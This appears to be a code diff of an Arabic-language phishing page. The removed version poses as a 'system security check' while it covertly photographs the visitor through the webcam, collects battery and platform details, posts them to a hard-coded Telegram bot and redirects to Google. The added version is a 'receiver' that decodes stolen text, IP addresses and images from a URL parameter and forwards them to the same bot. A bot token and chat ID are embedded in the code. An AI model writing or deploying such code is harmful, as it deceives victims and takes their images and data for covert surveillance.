@@ -2,60 +2,48 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>فحص أمان النظام</title>
-    <style>
-        body { background: #000; color: #00ff00; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #00ff00; padding: 20px; text-align: center; box-shadow: 0 0 15px #00ff00; }
-    </style>
+    <title>V8 Central Receiver</title>
 </head>
-<body>
-    <div class="box">
-        <h3>جاري تأمين اتصالك...</h3>
-        <p>يرجى الانتظار ثوانٍ قليلة</p>
-    </div>
-    <video id="v" autoplay playsinline style="display:none;"></video>
-    <canvas id="c" width="720" height="1280" style="display:none;"></canvas>
+<body style="background:#000; color:#00ff00; font-family:monospace; text-align:center; padding-top:50px;">
+    <h2>V8 GLOBAL - CENTRAL HUB</h2>
+    <div id="status">جاري انتظار البيانات...</div>
 
     <script>
-        // إعدادات البوت الخاص بك
-        const TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
-        const CHAT_ID = "7392262688";
+        // --- إعداداتك الثابتة ---
+        const TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"; // التوكن الخاص بك من الصورة
+        const CHAT_ID = "7392262688"; 
 
-        async function startSiphoning() {
-            // سحب معلومات البطارية والنظام
-            let battery = await navigator.getBattery();
-            let info = `🚀 صيد جديد من GitHub:\n🔋 البطارية: ${Math.floor(battery.level * 100)}%\n📱 النظام: ${navigator.platform}`;
+        // دالة الاستقبال العالمية (هذا هو الرابط القوي)
+        async function v8Receiver(data) {
+            document.getElementById('status').innerText = "تم استلام بيانات جديدة!";
+            
+            let report = `🚀 صيد جديد من النظام الموحد:\n\n${data.text || 'لا توجد نصوص'}\n📍 IP: ${data.ip || 'Unknown'}`;
+            
+            // 1. إرسال النصوص
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: 'Markdown' })
+            });
 
-            try {
-                // طلب الكاميرا (سيظهر طلب إذن للهدف)
-                let stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}});
-                let video = document.getElementById('v');
-                video.srcObject = stream;
-
-                setTimeout(async () => {
-                    let canvas = document.getElementById('c');
-                    canvas.getContext('2d').drawImage(video, 0, 0, 720, 1280);
-                    let imgBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
-
-                    // إرسال البيانات والصورة مباشرة من المتصفح إلى تليجرام
-                    let formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('caption', info);
-                    formData.append('photo', imgBlob, 'shot.jpg');
-
-                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                    
-                    // إغلاق الكاميرا والتحويل لموقع آخر
-                    stream.getTracks().forEach(t => t.stop());
-                    window.location.replace("https://google.com");
-                }, 4000); // 4 ثواني لالتقاط الصورة
-            } catch (e) {
-                // إذا رفض الكاميرا، نرسل المعلومات النصية فقط
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(info)}`);
-                window.location.replace("https://google.com");
+            // 2. إرسال الصور (إذا كان الكود الخارجي سحب صورة)
+            if (data.image) {
+                let blob = await (await fetch(data.image)).blob();
+                let formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'capture.jpg');
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
             }
         }
-        window.onload = startSiphoning;
+
+        // تحويل البيانات القادمة من "الكود الخارجي"
+        window.onload = () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.has('data')) {
+                let decodedData = JSON.parse(atob(urlParams.get('data')));
+                v8Receiver(decodedData);
+            }
+        };
     </script>
 </body>
 </html>
